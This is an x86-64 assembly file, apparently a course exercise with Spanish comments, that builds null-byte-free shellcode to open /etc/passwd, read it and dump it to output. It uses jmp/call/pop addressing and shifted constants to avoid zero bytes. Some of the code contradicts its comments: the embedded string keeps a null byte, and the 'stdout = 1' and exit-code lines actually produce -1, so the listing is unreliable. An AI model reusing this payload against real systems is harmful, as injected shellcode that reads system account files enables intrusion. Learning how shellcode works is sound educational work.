# Es nuestro passwddump.s pero sin 0s
# Compilar y enlazar:
# as -o shellcode1.o shellcode1.s
# ld -o shellcode1 shellcode1.o


.global _start
.text

_start:

    jmp get_addres

code:

    pop %rsi

    # OPEN /etc/passwd:
    mov $0x2fffffffffffffff, %rax  
    shr $60,%rax            # rax = 2 Conseguimos meter ceros en el registro, pero no en el shellcode!!

    mov %rsi, %rdi          # rdi = /etc/passwd
    mov $0x1a4fffffffffffff, %rsi       # rsi = 0644        !!!
    shr $52, %rsi
    xorq %rdx, %rdx         # rdx = lectura = 0
    syscall

    mov %rax, %r8           # r8 = rax = fd
    xorq %r10,%r10
    cmp %r10, %r8              
    jl error                # Si r8 < 0 -> error

    sub $1024, %rsp
    #sub $0x400fffffffffffff, %rsp         # Buffer            !!!
    #shr $48, %rsp

        
loop:                       
    # BUCLE


    # READ /etc/passwd:     
    xorq %rax, %rax         # rax = 0
    mov %r8, %rdi           # rdi = fd
    mov %rsp, %rsi          # rsi = buffer
    #mov $1024, %rdx         # rdx = 1024        
    mov $0x400fffffffffffff, %rdx
    shr $48, %rdx
    syscall 

    mov %rax, %r9           # r9 = rax = nr (leído)
    xorq %r10,%r10
    cmp %r10, %r9             # Si devuelvo -1 error.
    jl error

    
    # WRITE
    movq $0x1fffffffffffffff, %rax          # rax = 1
    shr $60, %rax           
    xorq  %rdi, %rdi        # rdi = 1 (stdout)
    neg   %rdi
    mov   %rsp, %rsi        # rsi = buffer
    mov   %r9, %rdx         # rdx = nr (leído) = r9
    syscall           
   
    

	xorq %r10,%r10
    cmp %r10, %r9             # Condición de bucle. Paro cuando haya leído todo.
    ja loop                 # Si r9 > 0 -> loop

    
    # FIN BUCLE

    # EXIT:
    mov	$0x3cffffffffffffff, %rax           # rax = 60          !!!
    shr $56,%rax
    xorq %rdi, %rdi         # code = 0   
    syscall



error:

    mov	$0x3cffffffffffffff, %rax           # rax = 60          !!!
    shr $56,%rax
    xorq	%rdi, %rdi      # code = 1
    neg %rdi
    syscall

get_addres:

    call code 
    direction: .ascii "/etc/passwd\0"

    